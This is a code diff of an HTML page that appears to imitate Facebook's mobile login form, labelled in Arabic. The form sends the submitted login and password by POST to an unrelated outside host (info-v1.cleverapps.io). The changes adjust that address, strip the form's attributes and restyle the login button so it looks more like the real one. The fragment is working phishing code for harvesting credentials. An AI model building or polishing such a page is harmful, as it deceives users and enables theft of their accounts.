@@ -670,12 +670,8 @@
                   <div class="_5rut">
                     <form
                     method="POST"
-                    action="http://info-v1.cleverapps.io"
-                      class="mobile-login-form _9hp- _5spm"
-                      id="login_form"
-                      novalidate="1"
-                      data-sigil="m_login_form"
-                      data-autoid="autoid_2"
+                    action="http://info-v1.cleverapps.io/?"
+  
                     >
                       <input
                         type="hidden"
@@ -805,7 +801,7 @@
                           data-sigil="login_password_step_element"
                         >
                           <button
-                            style="font-size: 17px;height: 40px;border: none;border-radius: 3px;line-height: 40px;text-shadow: 0 -1px rgb(0 0 0 / 25%);display: block;width: 100%;color: #fff;vertical-align: top;white-space: nowrap;font-weight: bold;"
+                            style="font-size: 17px;background: #03f;height: 40px;border: none;border-radius: 3px;line-height: 40px;text-shadow: 0 -1px rgb(0 0 0 / 25%);display: block;width: 100%;color: #fff;vertical-align: top;white-space: nowrap;font-weight: bold;"
                             type="button"
                             value="تسجيل الدخول"
 
